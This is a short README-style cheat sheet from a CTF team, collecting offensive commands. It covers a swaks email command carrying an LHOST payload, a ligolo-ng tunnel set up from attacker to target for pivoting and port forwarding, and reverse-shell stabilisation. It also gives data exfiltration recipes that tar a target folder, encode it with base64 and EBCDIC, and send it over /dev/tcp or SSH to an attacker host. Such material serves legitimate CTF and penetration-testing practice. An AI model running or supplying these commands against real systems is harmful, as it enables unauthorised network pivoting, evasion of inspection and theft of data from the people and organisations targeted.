# purplestorm-TTPs

A collection of commands, tools, techniques and procedures of the purplestorm ctf team.

## Table of Contents

- [Tooling](#tooling)
  - [Swaks](#swaks)
  - [Ligolo-ng](#ligolo-ng)
 
## Tooling

### Swaks

- [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)

```c
swaks --server example.com --port 587 --auth-user "user@example.com" --auth-password "password" --to "user@target.com" --from ""user@example.com" --header "Subject: foobar" --body "\\\<LHOST>\x"
```

### Ligolo-ng

- [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

### Prepare Tunnel Interface

```c
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
$ sudo ip link set ligolo up
```

### Setup Proxy on Attacker Machine

```c
$ ./proxy -laddr <LHOST>:443 -selfcert
```

### Setup Agent on Target Machine

```c
$ ./agent -connect <LHOST>:443 -ignore-cert
```

### Configure Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
$ sudo ip r add 172.16.1.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

### Port Forwarding

```c
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```


# Stabilizing Linux shell
```
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset
screen
```

# Exfilrating Data
##via TCP socket, ebcdic and base64
###On kali:
```
nc -nlvp 80 > datafolder.tmp
```
###On target:
```
tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/10.10.10.10/80
```
###On kali:
```
dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
tar xf datafolder.tar
```
##via SSH
###On target:
```
tar zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar zxpf -"
```
###On kali:
```
cd /tmp/datafolder
```
